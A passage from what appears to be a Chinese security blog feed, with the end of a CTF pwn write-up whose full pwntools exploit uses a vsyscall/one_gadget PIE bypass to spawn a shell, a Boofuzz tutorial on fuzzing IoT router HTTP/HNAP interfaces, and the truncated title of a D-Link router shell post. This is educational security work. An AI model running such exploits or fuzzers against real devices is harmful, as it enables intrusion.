class="number">999</span> )</span><br><span class="line">&#123;</span><br><span class="line">v7 = v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;More levels than before!&quot;</span>);</span><br><span class="line">v7 = <span class="number">1000L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">v4 = time(<span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure></li></ol><p>完整的利用代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;x86_64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_choice</span>(<span class="params">target, choice</span>):</span></span><br><span class="line">    target.recvuntil(<span class="string">&quot;Choice:\n&quot;</span>)</span><br><span class="line">    target.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_level</span>(<span class="params">target, level1, level2</span>):</span></span><br><span class="line">    target.recvuntil(<span class="string">&quot;How many levels?\n&quot;</span>)</span><br><span class="line">    target.sendline(<span class="built_in">str</span>(level1))</span><br><span class="line">    target.recvuntil(<span class="string">&quot;Any more?\n&quot;</span>)</span><br><span class="line">    target.sendline(<span class="built_in">str</span>(level2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auto_answer</span>(<span class="params">target, level, last_answer</span>):</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> xrange(<span class="number">0</span>, level):</span><br><span class="line">        target.recvuntil(<span class="string">&quot;Question: &quot;</span>)</span><br><span class="line">        temp = target.recvuntil(<span class="string">&quot;= ?&quot;</span>).strip(<span class="string">&quot;= ?&quot;</span>).strip().split(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">        target.recvuntil(<span class="string">&quot;Answer:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == level -<span class="number">1</span> :</span><br><span class="line">            <span class="comment"># <span class="doctag">XXX:</span> use send() instead of sendline()</span></span><br><span class="line">            target.send(last_answer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            target.send(<span class="built_in">str</span>(<span class="built_in">int</span>(temp[<span class="number">0</span>]) * <span class="built_in">int</span>(temp[<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">image_base = <span class="number">0x555555554000</span>     <span class="comment"># disable ASLR for debug purpose</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    <span class="comment"># <span class="doctag">FIXME:</span> error occurred when run with the provided libc</span></span><br><span class="line">    <span class="comment"># target = process(&#x27;./1000levels_patch&#x27;, env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so&#x27;&#125;)</span></span><br><span class="line">    target = process(<span class="string">&#x27;./1000levels_patch&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget_offset = <span class="number">0x4526a</span>     <span class="comment"># constraints: [$rsp+0x30] = 0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    target = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    one_gadget_offset = <span class="number">0x4526a</span>     <span class="comment"># constraints: [$rsp+0x30] = 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pwnlib.gdb.attach(target, <span class="string">&#x27;b *%#x\nc\n&#x27;</span> % (image_base + <span class="number">0xec2</span>))</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vsyscall_address = <span class="number">0xffffffffff600400</span>   <span class="comment"># <span class="doctag">XXX:</span> error occurred when using 0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line">input_choice(target, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">input_choice(target, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">first_level = -<span class="number">1</span></span><br><span class="line">second_level = one_gadget_offset - system_offset</span><br><span class="line">input_level(target, first_level, second_level)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(vsyscall_address) * <span class="number">3</span></span><br><span class="line">auto_answer(target, <span class="number">1000</span>, payload)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure><blockquote><ol><li>由于利用官方提供的<code>libc</code>库无法在本地运行，所以使用了本地的<code>libc</code>库进行测试；</li><li>跳到<code>vsyscall</code>开始处(即偏移<code>0x0</code>)时会报错，于是采用偏移<code>0x400</code>处的地址进行跳转。</li></ol></blockquote><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTc3NTIw">PIE保护详解和常用bypass手段<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly8weDQ4LnB3LzIwMTcvMDgvMjkvMHgzOS8=">HITB CTF 2017 Pwn题研究<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x1b3poYW90aWFuL2FydGljbGUvZGV0YWlscy83OTYwOTA3Nw==">VDSO与vsyscall<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9vbmVfZ2FkZ2V0">OneGadget<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="samples.zip">1000levels</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IoT设备固件分析之网络协议fuzz</title>
      <link href="2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/"/>
      <url>2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 通常，在对<code>IoT</code>设备的固件进行分析时，固件中与提供服务如<code>HTTP</code>、<code>Telnet</code>、<code>RTSP</code>、<code>UPnP</code>等相关的二进制程序是重点分析的对象。因为一旦在这些程序中发现漏洞，其很有可能会被远程利用，进而带来严重的安全隐患。</p><p>对固件二进制程序进行分析，常见的分析方法包括<strong>模糊测试</strong>、<strong>补丁比对</strong>、<strong>工具静态扫描</strong>和<strong>人工审计</strong>等。其中，模糊测试方法具备简单易用的特点，通常也比较有效，其在业界已被广泛使用。</p><a id="more"></a><p>下面，以某型号路由器为例，基于<a href="https://github.com/jtpereyda/boofuzz"><code>Boofuzz</code></a>框架，介绍对常见网络协议进行<code>fuzz</code>的方法。</p><blockquote><p>除了网络协议外，也可以采用类似的思路对其他协议如<code>BLE</code>、串口协议等进行<code>fuzz</code>。同时，该方法不仅局限于<code>IoT</code>设备，也可用于对常见的服务程序进行测试。</p></blockquote><h3 id="模糊测试简介"><a href="#模糊测试简介" class="headerlink" title="模糊测试简介"></a>模糊测试简介</h3><p><strong>模糊测试</strong>采用黑盒测试的思想，通过构造大量的畸形数据作为应用程序的输入，来发现程序中可能存在的安全缺陷或漏洞。</p><img data-src="images/模糊测试基本流程.png"><p>模糊测试方法的分类有很多。根据测试用例生成方式的不同，可以分为基于<strong>变异</strong>的模糊测试和基于<strong>生成</strong>的模糊测试。根据对目标程序的理解程度，可分为<strong>黑盒</strong>模糊测试、<strong>灰盒</strong>模糊测试和<strong>白盒</strong>模糊测试。常见工具与方法的对应关系如下。</p><img data-src="images/模糊测试工具与方法对应关系.png" style="zoom:60%"><p>针对<code>IoT</code>设备，由于其资源受限和环境受限等特点，实际中常采用黑盒模糊测试的方式。在对网络协议进行测试时，可以将常见的网络协议分为两类：一类属于<strong>文本协议</strong>，如<code>HTTP</code>、<code>FTP</code>等，这类协议的特点是其数据包内容都是可见字符；另一类为<strong>二进制协议</strong>，其特点是数据包内容大部分是不可见字符，这类协议在工控设备如<code>PLC</code>中比较常见，通常属于私有协议。针对文本协议，笔者常采用<a href="https://github.com/OpenRCE/sulley"><code>Sulley</code></a>框架进行测试；而针对二进制协议，则常采用<a href="https://github.com/cisco-sas/kitty"><code>kitty</code></a>框架进行测试。</p><blockquote><p><code>Sulley</code>框架和<code>kitty</code>框架均能够对两类协议进行测试。</p></blockquote><p>另外，在对<code>IoT</code>设备进行模糊测试时，需要考虑如何对设备进行监控，以判断是否出现异常。最简单的方式通过设备服务的可用性进行判断，如果设备提供的服务不可访问，表明设备可能崩溃了。但这种监控方式粒度比较粗，容易漏掉一些异常行为。另外，当设备出现异常后，还需要对环境进行恢复，以便继续进行测试。常见的方式就是重启设备。现在很多设备崩溃之后都会自动重启，如果测试目标设备没用提供这种机制，则需要采用其他方式解决。</p><h3 id="Boofuzz框架简介"><a href="#Boofuzz框架简介" class="headerlink" title="Boofuzz框架简介"></a><code>Boofuzz</code>框架简介</h3><p>由于<code>Sulley</code>框架目前已经停止更新维护，而<a href="https://github.com/jtpereyda/boofuzz"><code>Boofuzz</code></a>框架是<code>Sulley</code>的继承者，除了修复一些<code>bug</code>之外，还增加了框架的可扩展性。下面对<code>Boofuzz</code>框架进行简单介绍。</p><img data-src="images/boofuzz_framework.png" style="zoom:60%"><blockquote><p>来源: Fuzzing Sucks! Introducing the sulley fuzzing framework. Pedram Amini &amp; Aaron Portnoy. Black Hat US 2007</p></blockquote><p>由上图可知，该框架主要包含四个部分：</p><ul><li><p><code>数据生成</code>：根据协议格式利用原语来构造<code>请求</code>  </p></li><li><p><code>会话管理/驱动</code>：将<code>请求</code>以图的形式链接起来形成会话，同时管理<code>待测目标</code>、<code>代理</code>、<code>请求</code>，还提供一个web界面用于监视和控制</p></li><li><p><code>代理</code>：与目标进行交互以实现日志记录、对网络流量进行监控等</p><blockquote><p>通常，<code>代理</code>是运行在目标设备上。但是，对于<code>IoT</code>设备而言，大部分情况下都无法在目标设备上运行代理程序。</p></blockquote></li><li><p><code>实用工具</code>：独立的命令行工具，完成一些其他的功能</p></li></ul><p>其中，<code>数据生成</code>和<code>会话管理/驱动</code>是比较重要的2个模块。对于<code>数据生成</code>模块，<code>Boofuzz</code>框架提供了很多原语来定义<code>请求</code>，如最基础的<code>s_string()</code>、<code>s_byte()</code>、<code>s_static()</code>等。对于<code>会话管理/驱动</code>模块，其思想体现在下图中。</p><img data-src="images/session_graph.png"><blockquote><p>来源: Fuzzing Sucks! Introducing the sulley fuzzing framework. Pedram Amini &amp; Aaron Portnoy. Black Hat US 2007</p></blockquote><p>在上图中，节点<code>ehlo</code>、<code>helo</code>、<code>mail from</code>、<code>rcpt to</code>、<code>data</code>表示5个<code>请求</code>，路径<code>&#39;ehlo&#39;-&gt;&#39;mail form&#39;-&gt;&#39;rcpt to&#39;-&gt;&#39;data&#39;</code>和<code>&#39;helo&#39;-&gt;&#39;mail from&#39;-&gt;&#39;rcpt to&#39;-&gt;data&#39;</code>体现了<code>请求</code>之间的先后顺序关系。<code>callback_one()</code>和<code>callback_two()</code>表示回调函数，当从节点<code>echo</code>移动到节点<code>mail from</code>时会触发该回调函数，利用这一机制，节点<code>mail from</code>可以获取节点<code>ehlo</code>中的一些信息。而<code>pre_send()</code>和<code>post_send()</code>则负责测试前的一些预处理工作和测试后的一些清理工作。</p><p>理解了这几个模块的功能后，使用该框架进行测试的主要步骤如下：</p><ol><li>根据网络数据包构造<code>请求</code>；</li><li>设置会话信息(包括测试目标的<code>ip</code>地址和端口等)，然后按照请求的先后顺序将其链接起来；</li><li>添加对目标设备的监控和设备重启机制等；</li><li>开始<code>fuzz</code>。</li></ol><h3 id="协议fuzz实战"><a href="#协议fuzz实战" class="headerlink" title="协议fuzz实战"></a>协议<code>fuzz</code>实战</h3><p>以某型号路由器为例，由于路由器上<code>HTTP</code>服务是最为常见的，故以<code>http</code>协议为例进行介绍。</p><blockquote><p>模糊测试属于动态分析技术，因此需要有真实设备，或者采用对固件进行仿真的方式。</p></blockquote><h4 id="根据网络数据包构造请求"><a href="#根据网络数据包构造请求" class="headerlink" title="根据网络数据包构造请求"></a>根据网络数据包构造请求</h4><p>首先，需要尽可能多地与设备进行交互，然后捕获相应的<code>http</code>请求数据包，如下。</p><img data-src="images/wireshark_requests.png"><p>以登录请求为例，对应的<code>http</code>请求报文示例如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HNAP1&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 400</span><br><span class="line">HNAP_AUTH: E889FD5249E5D51C6C9424283DE3B5DB 1553349899</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.121 Safari&#x2F;537.36</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;Login&quot;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns&#x3D;&quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;&quot;&gt;&lt;Action&gt;request&lt;&#x2F;Action&gt;&lt;Username&gt;xxx&lt;&#x2F;Username&gt;&lt;LoginPassword&gt;xxx&lt;&#x2F;LoginPassword&gt;&lt;Captcha&gt;&lt;&#x2F;Captcha&gt;&lt;&#x2F;Login&gt;&lt;&#x2F;soap:Body&gt;&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p>利用该框架中提供的原语对<code>http</code>请求进行定义，部分示例如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s_initialize(<span class="string">&#x27;login&#x27;</span>)<span class="comment"># 整个请求的名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应 POST /HNAP1/ HTTP/1.1</span></span><br><span class="line">s_string(<span class="string">&#x27;POST&#x27;</span>, name=<span class="string">&#x27;method&#x27;</span>)<span class="comment"># 对该字段进行fuzz</span></span><br><span class="line">s_static(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">s_static(<span class="string">&#x27;/HNAP1/&#x27;</span>, name=<span class="string">&#x27;url&#x27;</span>)<span class="comment"># 不对该字段进行fuzz</span></span><br><span class="line">s_static(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">s_static(<span class="string">&#x27;HTTP/1.1&#x27;</span>)</span><br><span class="line">s_static(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应 Content-Length: 400</span></span><br><span class="line">s_static(<span class="string">&#x27;Content-Length&#x27;</span>)</span><br><span class="line">s_static(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">s_size(<span class="string">&#x27;data&#x27;</span>, output_format=<span class="string">&#x27;ascii&#x27;</span>, fuzzable=<span class="literal">True</span>)<span class="comment"># size的值根据data部分的长度自动进行计算，同时对该字段进行fuzz</span></span><br><span class="line">s_static(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应http请求数据</span></span><br><span class="line"><span class="keyword">with</span> s_block(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">    s_string(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&#x27;</span>)</span><br><span class="line">    s_static(<span class="string">&#x27;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&#x27;</span>)</span><br><span class="line">    s_static(<span class="string">&#x27;&lt;soap:Body&gt;&#x27;</span>)</span><br><span class="line">    s_static(<span class="string">&#x27;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&#x27;</span>)</span><br><span class="line">    s_static(<span class="string">&#x27;&lt;Action&gt;&#x27;</span>)</span><br><span class="line">    s_string(<span class="string">&#x27;login&#x27;</span>, max_len=<span class="number">1024</span>)<span class="comment"># 字段变异后的最大长度为1024</span></span><br><span class="line">    s_static(<span class="string">&#x27;&lt;/Action&gt;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 省略部分内容</span></span><br><span class="line">    s_static(<span class="string">&#x27;&lt;/soap:Envelope&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>是否对某个字段进行fuzz需根据具体情况确定。对所有字段都fuzz，生成的畸形数据包会非常多，测试所耗费的时间比较长，但发现问题的可能性比较大；只对少部分字段进行fuzz，生成的畸形数据包会比较少，测试所耗费的时间更短，同时发现问题的可能性也比较小。</p><blockquote><p>字段的粒度大小可能也会对测试结果有所影响。比如，如果对<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>进行变异，是将其当作一个整体，还是拆分为更小的单元?</p></blockquote><p>至于具体怎么对某个字段进行变异，如针对字符串的变异，该框架内已包含一些规则。当然，也可以自己增加规则。</p><p>类似的，对网络数据包中的其他<code>http</code>接口请求进行同样的定义。</p><blockquote><p> 测试的接口越多，触发问题的可能性越大。</p></blockquote><h4 id="设置会话信息"><a href="#设置会话信息" class="headerlink" title="设置会话信息"></a>设置会话信息</h4><p>根据捕获的数据包定义完<code>请求</code>后，设置与<code>会话</code>相关的信息，包括目标设备的ip地址、端口等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">host = <span class="string">&#x27;192.168.2.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他参数可以按需设置，比如添加fuzz_loggers来保存测试用例和结果等</span></span><br><span class="line">session = Session(session_filename=<span class="string">&#x27;http_session&#x27;</span>, receive_data_after_fuzz=<span class="literal">True</span>, ignore_connection_reset=<span class="literal">True</span>, restart_sleep_time=<span class="number">10</span>)</span><br><span class="line">target = Target(</span><br><span class="line">    connection=SocketConnection(host, port, proto=<span class="string">&#x27;tcp&#x27;</span>),</span><br><span class="line">    netmon=Remote_NetworkMonitor(host, port, proto=<span class="string">&#x27;tcp&#x27;</span>))  <span class="comment"># 服务可用性监控</span></span><br><span class="line"></span><br><span class="line">session.add_target(target)</span><br></pre></td></tr></table></figure><p>然后将之前定义的<code>请求</code>按照一定的先后顺序链接起来，部分示例如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.connect(s_get(<span class="string">&#x27;login&#x27;</span>))<span class="comment"># 默认前置节点为root</span></span><br><span class="line">session.connect(s_get(<span class="string">&#x27;login&#x27;</span>), s_get(<span class="string">&#x27;setsysemailsettings&#x27;</span>), callback=add_auth_callback)</span><br><span class="line">session.connect(s_get(<span class="string">&#x27;login&#x27;</span>),s_get(<span class="string">&#x27;setsyslogsettings&#x27;</span>), callback=add_auth_callback)</span><br><span class="line">session.connect(s_get(<span class="string">&#x27;login&#x27;</span>),s_get(<span class="string">&#x27;setschedulesettings&#x27;</span>), callback=add_auth_callback)</span><br></pre></td></tr></table></figure><p>其中，由于<code>setsysemailsettings</code>、<code>setsyslogsettings</code>、<code>setschedulesettings</code>等请求需要在登录之后才可以正常使用，所以需要在<code>login</code>请求之后发生。而<code>setsysemailsettings</code>、<code>setsyslogsettings</code>和<code>setschedulesettings</code>这几个请求之间则没有明确的先后关系。<code>add_auth_callback</code>为自定义的回调函数，主要用于从<code>login</code>请求中获取用于登录认证的信息如<code>cookie</code>，然后将其设置于<code>setsysemailsettings</code>、<code>setsyslogsettings</code>、<code>setschedulesettings</code>等请求中。</p><img data-src="images/session_graph_example.png" style="zoom:70%"><h4 id="添加对目标设备的监控"><a href="#添加对目标设备的监控" class="headerlink" title="添加对目标设备的监控"></a>添加对目标设备的监控</h4><p>这里通过设备<code>HTTP</code>服务的可用性来判断目标设备是否发生异常。如果<code>HTTP</code>服务无法访问，说明设备可能崩溃了。前面设置的<code>Remote_NetworkMonitor()</code>就是用于对服务的可用性进行监测，其核心代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过TCP全连接来判断目标端口是否在监听</span></span><br><span class="line"><span class="keyword">if</span> self.proto == <span class="string">&quot;tcp&quot;</span> <span class="keyword">or</span> self.proto == <span class="string">&quot;ssl&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self._sock.connect((self.host, self.port))</span><br><span class="line">        self.alive_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">   self.alive_flag = <span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p><code>Remote_NetworkMonitor()</code>为自行添加的代码，不属于<code>Boofuzz</code>框架。</p></blockquote><p>前面也提到过，该监测方式的粒度比较粗，可能会存在漏报，可以采用或结合一些其他的方式进行改进。</p><ul><li>如果可能，在测试时对设备内部的输出日志进行记录，比如设备打印的一些输出信息；</li><li>如果可能，在gdb调试状态下进行测试。</li></ul><p>至于对环境进行恢复，由于该设备崩溃后会自行重启，所以无须额外的操作，只需调用<code>sleep()</code>等待设备重启后即可。</p><h4 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>最后调用<code>session.fuzz()</code>驱动整个过程，然后运行脚本即可。默认情况下，会在26000端口开启一个web服务，用于控制或查看测试的进度及相关信息等。在测试完成后，可以通过查看测试记录，看是否有测试用例造成目标设备出现异常，以进行进一步分析。</p><img data-src="images/boofuzz_webinterface.png" style="zoom:80%"><blockquote><p>笔者目前尚未对使用的<code>Boofuzz</code>框架进行更新。在最新的commit中，对web界面进行了改进，显示的信息更丰富。</p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文以<code>IoT</code>设备为例，对模糊测试框架<code>Boofuzz</code>，以及利用该框架对网络协议进行fuzz的基本流程进行了简要介绍。如果想要获得更好的效果，还需要对其中的细节进行进一步的优化与完善。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p0cGVyZXlkYS9ib29mdXp6">boofuzz: Network Protocol Fuzzing for Humans<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2RvY3BsYXllci5uZXQvNDI5NDc1MjYtRnV6emluZy1zdWNrcy1pbnRyb2R1Y2luZy1zdWxsZXktZnV6emluZy1mcmFtZXdvcmstcGVkcmFtLWFtaW5pLTEtYWFyb24tcG9ydG5veS0yLWJsYWNrLWhhdC11cy0yMDA3Lmh0bWw=">Fuzzing Sucks! Introducing Sulley Fuzzing Framework<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNWd3SnBxajd5c3VlMTlPY29QSTE2QQ==">https://mp.weixin.qq.com/s/5gwJpqj7ysue19OcoPI16A<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
          <category> fuzz </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-850L路由器分析之获取设备shell</title>
      <link href="2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/"/>
      <url>2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/</url>
      
